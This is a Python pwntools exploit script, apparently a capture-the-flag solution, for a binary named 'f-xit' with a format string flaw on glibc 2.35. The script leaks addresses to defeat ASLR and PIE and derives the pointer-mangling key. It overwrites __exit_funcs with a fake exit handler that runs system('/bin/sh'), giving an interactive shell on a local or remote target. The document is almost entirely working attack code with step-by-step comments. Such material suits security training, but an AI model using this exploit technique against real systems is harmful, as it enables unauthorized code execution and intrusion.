#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('f-xit')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, int(port))


# The program is very simple, there is an infinite loop where the user can enter data that is passed directly to `printf` as first argument (Format String vulnerability)

# If we enter `"quit"` in the first 4 bytes, the program uses `exit`, there is no return instruction in `main`

# Additional data: Glibc 2.35 (`__free_hook`, `__malloc_hook` and other hooks are disabled)

# Objective: Get leaks (ELF, Stack, Glibc) -> Bypass ASLR and PIE -> Exit handlers technique -> system("/bin/sh")


def main():
    p = get_process()

    # Leaks (positions are easily found debugging)
    p.sendline(b'%43$lx.%45$lx.%61$lx')
    leaks = p.recv().decode().split('.')
    main_addr = int(leaks[0], 16)
    data_addr = int(leaks[1], 16) - 0x228
    __libc_start_main_addr = int(leaks[2], 16) - 128

    log.info(f'Leaked main() address: {hex(main_addr)}')
    log.info(f'Leaked __libc_start_main() address: {hex(__libc_start_main_addr)}')
    log.info(f'Leaked data address: {hex(data_addr)}')

    # Bypass ASLR and PIE
    elf.address = main_addr - elf.sym.main
    glibc.address = __libc_start_main_addr - glibc.sym.__libc_start_main

    log.success(f'ELF base address: {hex(elf.address)}')
    log.success(f'Glibc base address: {hex(glibc.address)}')

    # Exit handler technique
    # https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html

    # Functions used to demangle exit handler pointers
    rol = lambda val, r_bits, max_bits: \
        (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
        ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

    ror = lambda val, r_bits, max_bits: \
        ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
        (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

    encrypt = lambda value, key: rol(value ^ key, 0x11, 64)

    # Functions involved in the process (found using GDB)
    __exit_funcs      = glibc.address + 0x219838
    exit_handler_addr = glibc.address + 0x21af00
    _dl_fini          = glibc.address + 0x230040  # This offset is different if ASLR is disabled (add `0x6000` in that case)

    log.info(f'__exit_funcs address: {hex(__exit_funcs)}')
    log.info(f'Original exit handler address: {hex(exit_handler_addr)}')
    log.info(f'_dl_fini address: {hex(_dl_fini)}')

    # Leak original exit handler function pointer (mangled)
    p.sendline(b'%7$s....' + p64(exit_handler_addr + 0x18))
    encrypted_function = u64(p.recv().strip().split(b'....')[0])

    # Find key using XOR (reverse encryption)
    key = ror(encrypted_function, 0x11, 64) ^ _dl_fini

    log.info(f'Encrypted function: {hex(encrypted_function)}')
    log.info(f'Encryption key: {hex(key)}')
    log.info(f'Sanity check: {hex(encrypt(_dl_fini, key))}')

    # Modify the exit handler pointer to one controlled by us (the stack address) using the Format String vulnerability
    payload = fmtstr_payload(6, { __exit_funcs: data_addr + 8 })
    p.sendline(payload)
    p.recv()

    # Enter a fake exit handler (plus `"quit"` in order to call `exit`)
    # The fake exit handler will call `system("/bin/sh")`, the exit handler function must be encrypted accordingly
    payload  = b'quit'.ljust(8, b'\0')
    payload += p64(0)
    payload += p64(1)
    payload += p64(4)
    payload += p64(encrypt(glibc.sym.system, key))
    payload += p64(next(glibc.search(b'/bin/sh')))

    # It is also possible to modify the original exit handler function pointer to `system` (encrypted) and then add `"/bin/sh"` argument, instead of creating a fake exit handler (`solve2.py`)

    p.sendline(payload)
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
